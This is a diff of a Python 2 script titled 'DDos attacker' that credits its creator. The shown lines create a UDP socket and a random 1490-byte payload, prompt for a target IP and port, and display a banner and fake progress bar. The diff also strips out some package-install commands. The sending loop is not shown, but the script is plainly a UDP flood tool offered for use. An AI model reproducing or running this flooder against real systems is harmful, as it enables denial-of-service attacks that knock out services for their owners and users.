@@ -13,16 +13,12 @@ month = now.month
 year = now.year
 
 ##############
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
+
 #############
 
-os.system (" pkg install figlet -y ")
-os.system (" pkg install ruby -y ")
-os.system (" gem install lolcat")
-os.system (" sudo apt-get install figlet -y ")
-os.system (" sudo apt-get install ruby -y ")
-os.system (" sudo gem install lolcat")
 os.system (" clear ")
 os.system (" figlet DDos attacker | lolcat ")
 
@@ -31,11 +27,13 @@ print "Creator : Amir codect (( JASEM ))"
 print "Github  : github.com/Jasem-codect"
 print "My id   : t.me/JSM_codect"
 print
+
 ip = raw_input("IP Target : ")
 port = input("Port        : ")
 
 os.system (" clear ")
 os.system (" figlet STARTING | lolcat ")
+
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
